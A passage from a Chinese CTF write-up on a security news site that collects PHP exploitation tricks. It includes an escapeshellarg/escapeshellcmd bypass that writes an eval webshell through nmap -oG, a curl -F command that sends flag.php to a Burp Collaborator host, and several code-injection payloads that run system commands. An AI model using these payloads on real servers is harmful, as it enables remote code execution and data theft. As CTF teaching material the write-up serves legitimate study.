data-original=\"https://p3.ssl.qhimg.com/t010c440a000cbf9991.png\"></p>\n<p>代码中是先使用了<strong>escapeshellarg</strong>函数，再使用<strong>escapeshellcmd</strong>函数便会引发上面的问题,再来仔细观察一下代码，发现<code>mkdir\\chadir</code>函数，创建目录和改变当前的目录，应该是要我们写文件进去的，<code>system()</code>函数又是一串namp命令后面拼接上GET传入的参数，因为参数经过了上面的参数处理，<code>；</code>等都会被转义，所以就要从拼接的namp命令想办法了，查了百度谷歌没查到，看了WP才知道</p>\n<blockquote><p>nmap命令中 参数<code>-oG</code>可以实现将命令和结果写到文件（也就是可以写木马）</p></blockquote>\n<p>接下来就写payload，<code>escapeshellarg</code>函数会先对host变量中的单引号进行转义，并且转义之后，在 <code>\\'</code> 的左右两边再加上单引号，变成 <code>'\\''</code></p>\n<p>然后<code>escapeshellcmd</code>函数，会对host变量中的特殊字符进行转义</p>\n<blockquote><p>（&amp;#;`|*?~&lt;&gt;^()[]{}$, \\x0A//和\\xFF以及不配对的单/双引号转义）</p></blockquote>\n<p>那么上面的 <code>\\</code> 就会被再次转义，比如变成 <code>'\\\\''</code><br>\n如果在字符串首尾加上单引号，经过<code>escapeshellarg</code>函数之后，就可以实现将单引号给闭合了，在经过<code>escapeshellcmd</code>函数的时候单引号就是配对的，就不会进行转义</p>\n<p>如：</p>\n<pre><code class=\"lang-cpp\">' lemon shy '\r\nescapeshellarg：''\\'' lemon shy ''\\''\r\nescapeshellcmd: ''\\\\'' lemon shy ''\\\\''\r\n</code></pre>\n<p>这样就很好理解了，那就会可以实现单引号的逃逸了，接下来就来测试payload：</p>\n<p><img class=\"alignnone size-full wp-image-234372 aligncenter\" alt=\"\" width=\"1399\" height=\"173\" data-original=\"https://p5.ssl.qhimg.com/t01de4a45d0e3d871ec.png\"></p>\n<pre><code class=\"lang-cpp\">' &lt;?php phpinfo();?&gt; -oG 1.php'\r\n如果最后的单引号是没有空格，则文件名后面就会多出\\\\，所以后面要加上空格\r\n前面加空格不加则无影响，因为不会影响到一句话木马里面的内容\r\n</code></pre>\n<p>但还有一个问题，escapeshellcmd会把一句话木马中的一些字符给转义的，又该怎么办，测试一下在本地传一下发现虽然看起来转义了，但写入的话还是没有被转义的。</p>\n<p><img class=\"alignnone size-full wp-image-234373 aligncenter\" alt=\"\" width=\"868\" height=\"266\" data-original=\"https://p0.ssl.qhimg.com/t01ec3efacb2dfdd0ee.png\"></p>\n<p>所以最终的payload:</p>\n<pre><code class=\"lang-cpp\">' &lt;?php @eval($_POST[\"a\"]);?&gt; -oG 1.php '\r\n或\r\n'&lt;?php @eval($_POST[\"a\"]);?&gt; -oG 1.php '\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234374 aligncenter\" alt=\"\" width=\"884\" height=\"123\" data-original=\"https://p1.ssl.qhimg.com/t01ede0e7714aa5f455.png\"></p>\n<p>创建的目录也出来了，写的一句话木马文件在该目录下，连接一下，得到flag</p>\n<p><img class=\"alignnone size-full wp-image-234375 aligncenter\" alt=\"\" width=\"489\" height=\"161\" data-original=\"https://p1.ssl.qhimg.com/t0157fb4fc1d0a870a9.png\"></p>\n<p>也可以传一个GET进去，调用system函数</p>\n<pre><code class=\"lang-cpp\">' &lt;?php @eval($_GET[\"a\"]);?&gt; -oG 2.php '\r\n\r\nhttp://e5b384ba-6852-4e3f-9060-c66dc267e554.node3.buuoj.cn/8f9395193b358d86a100d2fd1f0349a2/2.php?a=system('cat /flag');\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234376 aligncenter\" alt=\"\" width=\"1401\" height=\"232\" data-original=\"https://p0.ssl.qhimg.com/t016faa37645e2d421a.png\"></p>\n<p> </p>\n<h2 name=\"h2-11\" id=\"h2-11\">0x11：PHP精度绕过缺陷</h2>\n<p>几次都碰到这个点，记录一下，省的以后忘了再去查</p>\n<p><strong>浮点运算的坑</strong></p>\n<p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，先来看个小例子</p>\n<p><img class=\"alignnone size-full wp-image-234377 aligncenter\" alt=\"\" width=\"1095\" height=\"152\" data-original=\"https://p1.ssl.qhimg.com/t01c852e37ce4ea7c31.png\"></p>\n<p>输出的是57，而我们预想的应该是58</p>\n<p>具体详细的原理可以看这位师傅的描述<br><a href=\"http://www.haodaquan.com/12\">http://www.haodaquan.com/12</a></p>\n<p>简单的说因为PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为 <code>1.11e-16</code>,当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了，如下图：</p>\n<p><img class=\"alignnone size-full wp-image-234378 aligncenter\" alt=\"\" width=\"1241\" height=\"154\" data-original=\"https://p1.ssl.qhimg.com/t01f061707d326ceca6.png\"></p>\n<p>再来看一道ciscn2020初赛的题，便考察了这一点：</p>\n<p><strong>easytrick</strong></p>\n<pre><code class=\"lang-bash\"> &lt;?php\r\nclass trick{\r\n    public $trick1;\r\n    public $trick2;\r\n    public function __destruct(){\r\n        $this-&gt;trick1 = (string)$this-&gt;trick1;\r\n        if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5){\r\n            die(\"你太长了\");\r\n        }\r\n        if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2){\r\n            echo file_get_contents(\"/flag\");\r\n        }\r\n    }\r\n}\r\nhighlight_file(__FILE__);\r\nunserialize($_GET['trick']);\r\n</code></pre>\n<p>看了Drom师傅的博客学到了这种方法：</p>\n<p>因为这道题是考察<strong>浮点数精度问题导致的大小比较以及函数处理问题</strong>，当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了</p>\n<pre><code class=\"lang-bash\">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE\r\nvar_dump(1.0000000000000001 == 1) &gt;&gt; TRUE\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234379 aligncenter\" alt=\"\" width=\"1196\" height=\"142\" data-original=\"https://p4.ssl.qhimg.com/t01886e21d4e23fc47f.png\"></p>\n<p><code>0.9999999999999999</code>（<strong>17个9</strong>）经过<code>strlen</code>函数会判断为1<br><img alt=\"\" data-original=\"https://cdn.nlark.com/yuque/0/2021/png/5370867/1613574465561-9932ecbc-6c62-45b1-8b12-0d1970c90f5e.png#align=left&amp;display=inline&amp;height=88&amp;margin=%5Bobject%20Object%5D&amp;originHeight=88&amp;originWidth=1080&amp;size=0&amp;status=done&amp;style=none&amp;width=1080\"><br>\n经过测试发现<code>!==</code>和<code>!=</code>均成立</p>\n<p><img class=\"alignnone size-full wp-image-234380 aligncenter\" alt=\"\" width=\"1127\" height=\"290\" data-original=\"https://p3.ssl.qhimg.com/t0134060560b1c06e18.png\"></p>\n<p>最后看一下md5函数处理后是否相同</p>\n<p><img class=\"alignnone size-full wp-image-234381 aligncenter\" alt=\"\" width=\"1010\" height=\"183\" data-original=\"https://p1.ssl.qhimg.com/t01345c49249940537e.png\"></p>\n<p>确实也成立，那就写payload即可</p>\n<pre><code class=\"lang-bash\">&lt;?php\r\nclass trick{\r\n    public $trick1 ;\r\n    public $trick2 ;\r\n}\r\n\r\n$shy = new trick();\r\n$shy-&gt;trick1 = 1;\r\n$shy-&gt;trick2 = 0.9999999999999999;\r\necho urlencode(serialize($a));\r\n</code></pre>\n<p>注意这里trick1的值必须为1，如果为0.9999999999999999则出不来结果，因为<code>$this-&gt;trick1 = (string)$this-&gt;trick1;</code>有这个语句的限制，如果为0.9999999999999999，则浮点数就变成了字符类型，因此就不会产生上面的浮点数精度问题</p>\n<p> </p>\n<h2 name=\"h2-12\" id=\"h2-12\">0x12:PHP中类的运用</h2>\n<h4 id=\"h4--reflectionclass\">\n<a class=\"reference-link\" name=\"%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass\"></a>反射类ReflectionClass</h4>\n<p>可以看官方的例子了解一下<br>\n这里举个例子，方便理解反射类ReflectionClass</p>\n<pre><code class=\"lang-groovy\">class fuc { //定义一个类\r\n\r\n static\r\n\r\n function ec() {\r\n\r\n  echo '我是一个类';\r\n\r\n }\r\n\r\n}\r\n\r\n$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类\r\n\r\n$fuc=$class-&gt;newInstance(); //相当于实例化 fuc 类\r\n\r\n$fuc-&gt;ec(); //执行 fuc 里的方法ec\r\n\r\n/*最后输出:我是一个类*/\r\n#还有其他用法\r\n$ec=$class-&gt;getmethod('ec'); //获取fuc 类中的ec方法\r\n\r\n$fuc=$class-&gt;newInstance(); //实例化\r\n\r\n$ec-&gt;invoke($fuc);   //执行ec 方法\r\n</code></pre>\n<p>例如这道题：</p>\n<p><img class=\"alignnone size-full wp-image-234382 aligncenter\" alt=\"\" width=\"1141\" height=\"505\" data-original=\"https://p2.ssl.qhimg.com/t0151feca63c02bf079.png\"></p>\n<p>payload：</p>\n<pre><code class=\"lang-groovy\">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\r\n</code></pre>\n<h4 id=\"h4--exception\">\n<a class=\"reference-link\" name=\"%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BBException\"></a>异常处理类Exception</h4>\n<p>先简单了解一下PHP异常处理</p>\n<p><img class=\"alignnone size-full wp-image-234383 aligncenter\" alt=\"\" width=\"932\" height=\"300\" data-original=\"https://p0.ssl.qhimg.com/t0108d654cf02dc0d1f.png\"></p>\n<p>这里举个例子，方便理解异常类</p>\n<pre><code class=\"lang-groovy\">&lt;?php\r\n// 创建一个有异常处理的函数\r\nfunction checkNum($number)\r\n{\r\n    if($number&gt;1)\r\n    {\r\n        throw new Exception(\"变量值必须小于等于 1\");\r\n    }\r\n        return true;\r\n}\r\n\r\n// 在 try 块 触发异常\r\ntry\r\n{\r\n    checkNum(2);\r\n    // 如果抛出异常，以下文本不会输出\r\n    echo '如果输出该内容，说明 $number 变量';\r\n}\r\n// 捕获异常\r\ncatch(Exception $e)\r\n{\r\n    echo 'Message: ' .$e-&gt;getMessage();\r\n}\r\n?&gt;\r\n上面代码将得到类似这样一个错误：Message: 变量值必须小于等于 1\r\n</code></pre>\n<p>例如这道题：</p>\n<p><img class=\"alignnone size-full wp-image-234384 aligncenter\" alt=\"\" width=\"816\" height=\"323\" data-original=\"https://p4.ssl.qhimg.com/t01ab86a4d47aeea68f.png\"></p>\n<pre><code class=\"lang-groovy\">?v1=Exception&amp;v2=system('ls')\r\n</code></pre>\n<p>虽然源代码中含有了括号，但是我们还是可以自己加上去，以及在里面设置参数，后面多出的（）不对结果造成影响</p>\n<h4 id=\"h4--filesystemiterator\">\n<a class=\"reference-link\" name=\"%E5%86%85%E7%BD%AE%E7%B1%BBFilesystemIterator\"></a>内置类FilesystemIterator</h4>\n<p>先简单了解一下这个类的作用</p>\n<blockquote><p>PHP使用FilesystemIterator迭代器遍历目录</p></blockquote>\n<p><img class=\"alignnone size-full wp-image-234385 aligncenter\" alt=\"\" width=\"1587\" height=\"475\" data-original=\"https://p2.ssl.qhimg.com/t01eb9e7e69f2adb436.png\"></p>\n<p>例如这道题：</p>\n<p><img class=\"alignnone size-full wp-image-234386 aligncenter\" alt=\"\" width=\"1270\" height=\"458\" data-original=\"https://p4.ssl.qhimg.com/t01902243be95cc16c8.png\"></p>\n<p>只需获取当前路径，便可以将当前目录下所有文件给显示出来，这里可以使用php中的getcwd这个函数</p>\n<blockquote><p>getchwd() 函数返回当前工作目录</p></blockquote>\n<p>故payload为</p>\n<pre><code class=\"lang-groovy\">?v1=FilesystemIterator&amp;v2=getcwd\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-13\" id=\"h2-13\">0x13：一些姿势汇总</h2>\n<h4 id=\"h4--proc-self-root-is_file-\">\n<a class=\"reference-link\" name=\"/proc/self/root%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0\"></a>/proc/self/root绕过is_file函数</h4>\n<p><img class=\"alignnone size-full wp-image-234387 aligncenter\" alt=\"\" width=\"851\" height=\"277\" data-original=\"https://p1.ssl.qhimg.com/t01750421cd2942e9a4.png\"></p>\n<p>payload:</p>\n<pre><code class=\"lang-groovy\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\r\nroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\r\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\r\nself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\r\nlf/root/proc/self/root/var/www/html/flag.php\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234388 aligncenter\" alt=\"\" width=\"896\" height=\"97\" data-original=\"https://p5.ssl.qhimg.com/t01a4b60ec83f6ca91b.png\"></p>\n<p>在linux中/proc/self/root是指向根目录的,这里看了很多师傅的wp，都是只记录了一个payload，找到了一个大师傅对于这个方法的解释</p>\n<h4 id=\"h4-gettext-amp-get_defined_vars-\">\n<a class=\"reference-link\" name=\"gettext&amp;get_defined_vars%E5%87%BD%E6%95%B0\"></a>gettext&amp;get_defined_vars函数</h4>\n<p><img class=\"alignnone size-full wp-image-234389 aligncenter\" alt=\"\" width=\"809\" height=\"350\" data-original=\"https://p1.ssl.qhimg.com/t01b9f4be8fb108cede.png\"></p>\n<p>这道题涉及到的是php中的gettext的用法，先了解一下</p>\n<blockquote><p>php的扩展gettext实现程序的国际化</p></blockquote>\n<p><img class=\"alignnone size-full wp-image-234390 aligncenter\" alt=\"\" width=\"1243\" height=\"292\" data-original=\"https://p5.ssl.qhimg.com/t01ca687893405944b8.png\"></p>\n<p><code>_()是gettext()</code>函数的简写形式，那既然变量f1过滤数字和字母，就可以使用该符号来代替这个函数，这样便可以绕过第一个嵌套，然后再由最外面的call_user_func执行命令</p>\n<pre><code class=\"lang-groovy\">call_user_func(call_user_func('_','phpinfo'))=&gt;call_user_func('phpinfo')\r\n</code></pre>\n<p>虽然该函数会报错</p>\n<p><img class=\"alignnone size-full wp-image-234391 aligncenter\" alt=\"\" width=\"1123\" height=\"55\" data-original=\"https://p0.ssl.qhimg.com/t01ee7c186408538bf1.png\"></p>\n<p>但是还是会继续执行，不会停止,这时候便会执行phpinfo这个命令，但这里要获取flag,就需要再了解一个函数<code>get_defined_vars</code></p>\n<p><img class=\"alignnone size-full wp-image-234392 aligncenter\" alt=\"\" width=\"1290\" height=\"404\" data-original=\"https://p5.ssl.qhimg.com/t0177ede25a046de4d7.png\"></p>\n<p>已知包含了flag.php。而flag.php肯定包含已定义好的变量列表的多维数组，故payload：</p>\n<pre><code class=\"lang-groovy\">?f1=_&amp;f2=get_defined_vars\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234393 aligncenter\" alt=\"\" width=\"1868\" height=\"257\" data-original=\"https://p5.ssl.qhimg.com/t01a6e52262a089ccba.png\"></p>\n<h4 id=\"h4-linux-tee-\">\n<a class=\"reference-link\" name=\"Linux%20tee%E5%91%BD%E4%BB%A4\"></a>Linux tee命令</h4>\n<p><code>tee</code>命令主要被用来向standout(标准输出流，通常是命令执行窗口）输出的同时也将内容输出到文件</p>\n<pre><code class=\"lang-groovy\">tee file1 file2 //复制文件\r\nls|tee Sn0w.txt //命令输出\r\n</code></pre>\n<p>例如这道题：</p>\n<p><img class=\"alignnone size-full wp-image-234394 aligncenter\" alt=\"\" width=\"1390\" height=\"311\" data-original=\"https://p2.ssl.qhimg.com/t01aa12f1a8fa1ebe39.png\"></p>\n<pre><code class=\"lang-groovy\">?c=ls /|tee Sn0w\r\n在url后面请求Sn0w文件\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234395 aligncenter\" alt=\"\" width=\"450\" height=\"446\" data-original=\"https://p3.ssl.qhimg.com/t01df0a06f8c1bc53d1.png\"></p>\n<h4 id=\"h4-burp-collaborator-client\">\n<a class=\"reference-link\" name=\"Burp%20Collaborator%20Client\"></a>Burp Collaborator Client</h4>\n<p><img class=\"alignnone size-full wp-image-234396 aligncenter\" alt=\"\" width=\"765\" height=\"383\" data-original=\"https://p1.ssl.qhimg.com/t01553f2c34b7a2463d.png\"></p>\n<p>这道题主要考察的是命令执行的骚操作和curl -F的使用</p>\n<p>如果传递的参数是$F本身，会不会出现变量覆盖那</p>\n<pre><code class=\"lang-groovy\">?F=`$F `;sleep 3\r\nsubstr函数截取前六位得到的是`$F `;\r\n然后$F便是输出的`$F `;sleep 3，故最后执行的代码是\r\n``$F `;sleep 3`\r\n``是shell_exec()函数的缩写\r\n</code></pre>\n<p>发现curl并没有被过滤，便可以利用curl带出flag.php，curl -F 将flag文件上传到Burp的 Collaborator Client( Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies)</p>\n<p><img class=\"alignnone size-full wp-image-234397 aligncenter\" alt=\"\" width=\"499\" height=\"379\" data-original=\"https://p3.ssl.qhimg.com/t01c5a4090a9387677c.png\"></p>\n<p><img class=\"alignnone size-full wp-image-234398 aligncenter\" alt=\"\" width=\"864\" height=\"760\" data-original=\"https://p3.ssl.qhimg.com/t01df8c04e4ca7e9f33.png\"></p>\n<p>payload：</p>\n<pre><code class=\"lang-groovy\">?F=`$F `;curl -X POST -F Sn0w=@flag.php  1216a307cv2bgog6aua6lmje157vvk.burpcollaborator.net\r\n</code></pre>\n<p>这里要解释一下</p>\n<pre><code class=\"lang-groovy\">#其中-F 为带文件的形式发送post请求\r\n#Sn0w是上传文件的name值，flag.php就是上传的文件\r\n</code></pre>\n<p>其实原理很简单，相当于这台服务器上传文件传输到burp的Collaborator Client</p>\n<h4 id=\"h4-call_user_func-\">\n<a class=\"reference-link\" name=\"call_user_func%E8%AF%BB%E5%8F%96%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0\"></a>call_user_func读取类中的函数</h4>\n<p>call_user_func函数可以调用类中的函数，这里举一个简单的例子</p>\n<pre><code class=\"lang-groovy\">class Test\r\n{    \r\n    static public function getS()\r\n    {\r\n        echo \"123\";\r\n    }\r\n}\r\n相当于\r\ncall_user_func(array('Test','getS'));\r\n#输出结果\r\n123\r\n定义一个类Test及类方法getS,call_user_func的输入参数变为一个数组，数组第一个元素为对象名、第二个元素为参数\r\n#如果不加static，数据会出现，但是有可能会报错\r\n</code></pre>\n<p>例如：</p>\n<p><img class=\"alignnone size-full wp-image-234399 aligncenter\" alt=\"\" width=\"652\" height=\"489\" data-original=\"https://p4.ssl.qhimg.com/t01f37a3b1225727772.png\"></p>\n<p>payload：</p>\n<pre><code class=\"lang-groovy\">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\r\n</code></pre>\n<h4 id=\"h4-create_function-\">\n<a class=\"reference-link\" name=\"create_function%E5%87%BD%E6%95%B0\"></a>create_function函数</h4>\n<p>create_function，第一个参数是参数，第二个参数是内容，函数结构类似：</p>\n<pre><code class=\"lang-php\">create_function('$a,$b','return 111')\r\n相当于如下：\r\nfunction a($a, $b){\r\n    return 111;\r\n}\r\n</code></pre>\n<p>所以那如果我们这样进行构造payload</p>\n<pre><code class=\"lang-php\">create_function('$a,$b','return 111;}phpinfo();//')\r\n\r\nfunction a($a, $b){\r\n    return 111;}phpinfo();//\r\n}\r\n</code></pre>\n<p>phpinfo()便会被执行，所以根据这个思路来进行构造payload</p>\n<pre><code class=\"lang-php\">?show=echo Sn0w;}system('cat f*');//\r\nDATA:\r\nctf=%5ccreate_function</code><code>\r\n</code></pre>\n</body>\n</html>","index":[{"title":"前言：","id":"#h2-0","sub":[]},{"title":"0x00:Hash比较缺陷","id":"#h2-1","sub":[]},{"title":"0x01:md5","id":"#h2-2","sub":[]},{"title":"0x03:intval函数绕过","id":"#h2-3","sub":[]},{"title":"0x04:preg_match函数绕过","id":"#h2-4","sub":[]},{"title":"0x05: preg_replace /e 模式下的代码执行","id":"#h2-5","sub":[]},{"title":"0x06：in_array宽松比较","id":"#h2-6","sub":[]},{"title":"0x07:变量覆盖","id":"#h2-7","sub":[]},{"title":"0x08:通过数组绕过","id":"#h2-8","sub":[]},{"title":"0x09：PHP自身特性","id":"#h2-9","sub":[]},{"title":"0x10：escapeshellarg&escapeshellcmd函数绕过","id":"#h2-10","sub":[]},{"title":"0x11：PHP精度绕过缺陷","id":"#h2-11","sub":[]},{"title":"0x12:PHP中类的运用","id":"#h2-12","sub":[]},{"title":"0x13：一些姿势汇总","id":"#h2-13","sub":[]}],"success":true},"share":{"title":"CTF/PHP特性汇总","desc":"做CTF题时经常会遇到各种php弱类型和一些函数的绕过方法，由于知识比较零碎，就总结一下我所遇到的，也方便自己以后观看。","imgUrl":"https://p5.ssl.qhimg.com/sdm/160_160_100/t0156b4ea7a1af8f08b.png"},"author":{"nickname":"Sn0w","user_url":"","id":141811,"avatar":"https://p4.ssl.qhimg.com/t015b53550d07592c19.png","banner":"https://p1.ssl.qhimg.com/t018485aa921b79f341.png","location":"","user_label":"verify","description":"冲冲冲","register_date":"2019-04-16 11:28:07","self":false,"follow":false,"post_count":3,"follower_count":7,"follow_count":1,"comment_count":12},"relevant":[{"id":286967,"title":"Ichunqiu云境 —— Exchange Writeup","date":"2023-03-03 14:30:36"},{"id":284201,"title":"Ichunqiu云境 - Delegation Writeup","date":"2023-01-06 10:30:50"},{"id":284260,"title":"Ichunqiu云境 —— Tsclient Writeup","date":"2023-01-05 10:30:31"},{"id":284307,"title":"活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！","date":"2022-12-21 17:00:34"},{"id":283073,"title":"从一道题入门 UEFI PWN","date":"2022-11-11 15:30:05"},{"id":282335,"title":"2022年工业信息安全技能大赛“望岳杯”锦标赛 wp","date":"2022-10-31 15:30:36"},{"id":277807,"title":"精彩回顾 | 冠军出炉！2022字节安全AI挑战赛圆满落幕","date":"2022-10-19 15:00:56"}],"authorPostList":[{"post_id":231507,"title":"CTF/PHP特性汇总","cover":"https://p5.ssl.qhimg.com/sdm/229_160_100/t0156b4ea7a1af8f08b.png","date":"2021-03-15 14:30:04"},{"post_id":231407,"title":"从浅入深学习PHP文件包含","cover":"https://p5.ssl.qhimg.com/sdm/229_160_100/t0115156126d71d26a9.jpg","date":"2021-03-04 15:30:59"},{"post_id":228176,"title":"浅析Python SSTI/沙盒逃逸","cover":"https://p0.ssl.qhimg.com/sdm/229_160_100/t0152caccc32bd33a81.jpg","date":"2021-01-29 14:30:10"}],"cookie":[]}};
+//published at: 3/18/2023, 12:15:22 PM</script>
+
+<script src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/a89b1e55fab19834,969b9d2ab6d58ff9.js.下载"></script>
+<script src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/e855bc476c0070c4,d70645fabcfd28e5,b00f894d26352cfe,374cd4f654903275,1fbf0cc911f15a9c.js.下载"></script>
+<script src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/43c736269a19e5f8,d7c4492c306d9e12.js.下载"></script>
+<script src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/c3f64e723fc684b2,d29a864a4b5dd4b6,5c4b8b1bbe75533d,f59329488ebbc180,569b6657398e046f,50a9d6f78d7b9c2b,ffa01aa1dfa9875c,1e0c54ddfbe618cb,cc52ec6e18fb5e0f,7e2ef3c63800d75a,163f062eddf12afb,12d46f8299.下载"></script><div id="js-toast" data-v-app=""></div><!----><div id="js-lift" data-v-app=""></div><div class="_15"></div>
+
+
+<div id="gtx-trans" style="position: absolute; left: 424px; top: 3621.22px;"><div class="gtx-trans-icon"></div></div></body></html>
